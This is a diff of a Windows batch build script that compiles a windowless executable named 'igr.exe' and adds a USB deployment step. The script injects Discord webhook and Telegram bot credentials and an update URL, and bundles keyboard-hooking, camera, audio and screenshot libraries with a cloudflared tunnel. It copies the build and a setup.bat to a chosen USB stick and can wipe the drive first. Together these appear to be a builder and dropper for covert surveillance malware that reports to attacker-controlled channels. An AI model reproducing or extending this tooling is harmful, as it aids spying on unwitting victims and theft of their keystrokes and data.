@@ -14,7 +14,7 @@ if not exist "config.txt" (
 )
 
 REM Read config.txt values
-echo [1/5] Reading config.txt...
+echo [1/6] Reading config.txt...
 set "DISCORD_WEBHOOK="
 set "DISCORD_USERNAME=IGR"
 set "DASHBOARD_PASSWORD="
@@ -34,18 +34,28 @@ for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do (
     )
 )
 
-if not defined DISCORD_WEBHOOK (
-    echo   WARNING: DISCORD_WEBHOOK is empty in config.txt
+REM Validate: at least 1 of Discord or Telegram must be configured
+set "HAS_DISCORD=0"
+set "HAS_TELEGRAM=0"
+if defined DISCORD_WEBHOOK set "HAS_DISCORD=1"
+if defined TELEGRAM_BOT_TOKEN if defined TELEGRAM_CHAT_ID set "HAS_TELEGRAM=1"
+
+if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
+    echo ERROR: At least Discord or Telegram must be configured in config.txt!
+    echo   Set DISCORD_WEBHOOK or TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID.
+    pause
+    exit /b 1
 )
-if not defined DASHBOARD_PASSWORD (
-    echo   WARNING: DASHBOARD_PASSWORD is empty in config.txt
-)
+
+if "%HAS_DISCORD%"=="0" echo   NOTE: Discord not configured, using Telegram only.
+if "%HAS_TELEGRAM%"=="0" echo   NOTE: Telegram not configured, using Discord only.
+if not defined DASHBOARD_PASSWORD echo   WARNING: DASHBOARD_PASSWORD is empty.
 
 echo   Config loaded.
 
 REM Create build copy of main.py with injected values
 echo.
-echo [2/5] Injecting configuration...
+echo [2/6] Injecting configuration...
 copy /y "main.py" "main_build.py" >nul
 
 powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"
@@ -53,12 +63,12 @@ powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_
 echo   Values injected.
 
 echo.
-echo [3/5] Installing dependencies...
+echo [3/6] Installing dependencies...
 pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
 echo   Done.
 
 echo.
-echo [4/5] Downloading cloudflared if missing...
+echo [4/6] Downloading cloudflared if missing...
 if not exist cloudflared.exe (
     echo Downloading cloudflared...
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
@@ -72,7 +82,7 @@ if not exist cloudflared.exe (
 )
 
 echo.
-echo [5/5] Compiling igr.exe...
+echo [5/6] Compiling igr.exe...
 python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
@@ -99,15 +109,91 @@ if not exist "dist\igr.exe" (
 )
 
 echo.
-echo ============================================
-echo   BUILD SUCCESSFUL
-echo ============================================
-echo   Output: dist\igr.exe
+echo [6/6] USB Deployment...
 echo.
-echo   Copy these to USB stick subfiles\ folder:
-echo     1. dist\igr.exe
-echo     2. cloudflared.exe
-echo   And setup.bat to USB root.
+
+REM Detect removable drives (USB sticks)
+set "USB_COUNT=0"
+for /f "tokens=1 delims= " %%d in ('wmic logicaldisk where "drivetype=2" get deviceid 2^>nul ^| find ":"') do (
+    set /a USB_COUNT+=1
+    set "USB_!USB_COUNT!=%%d"
+)
+
+if %USB_COUNT%==0 (
+    echo   No USB sticks detected.
+    echo.
+    echo ============================================
+    echo   BUILD SUCCESSFUL
+    echo ============================================
+    echo   Output: dist\igr.exe
+    echo.
+    echo   Manually copy to USB:
+    echo     USB root:       setup.bat
+    echo     USB\subfiles\:   igr.exe, cloudflared.exe
+    echo ============================================
+    echo.
+    pause
+    exit /b 0
+)
+
+echo   Found %USB_COUNT% USB stick(s):
+for /l %%i in (1,1,%USB_COUNT%) do (
+    echo     %%i. !USB_%%i!
+)
+echo.
+
+set /p "USB_CHOICE=Select USB stick number (or 0 to skip): "
+if "%USB_CHOICE%"=="0" (
+    echo   Skipped USB deployment.
+    echo.
+    echo ============================================
+    echo   BUILD SUCCESSFUL
+    echo ============================================
+    echo   Output: dist\igr.exe
+    echo ============================================
+    echo.
+    pause
+    exit /b 0
+)
+
+set "USB_DRIVE=!USB_%USB_CHOICE%!"
+if not defined USB_DRIVE (
+    echo   Invalid choice.
+    pause
+    exit /b 1
+)
+
+echo.
+echo   Selected: %USB_DRIVE%
+echo.
+echo   [1] Wipe USB and install IGR only
+echo   [2] Add IGR alongside existing files
+echo.
+set /p "USB_MODE=Choose mode (1 or 2): "
+
+if "%USB_MODE%"=="1" (
+    echo.
+    echo   Wiping %USB_DRIVE% ...
+    rd /s /q "%USB_DRIVE%\" 2>nul
+    del /q "%USB_DRIVE%\*" 2>nul
+    echo   Done.
+)
+
+echo.
+echo   Copying files to %USB_DRIVE% ...
+if not exist "%USB_DRIVE%\subfiles" mkdir "%USB_DRIVE%\subfiles"
+copy /y "dist\igr.exe" "%USB_DRIVE%\subfiles\igr.exe" >nul
+copy /y "cloudflared.exe" "%USB_DRIVE%\subfiles\cloudflared.exe" >nul
+copy /y "setup.bat" "%USB_DRIVE%\setup.bat" >nul
+echo   Done.
+
+echo.
+echo ============================================
+echo   BUILD + USB DEPLOY SUCCESSFUL
+echo ============================================
+echo   USB: %USB_DRIVE%
+echo     Root:       setup.bat
+echo     subfiles\:  igr.exe, cloudflared.exe
 echo ============================================
 echo.
 pause
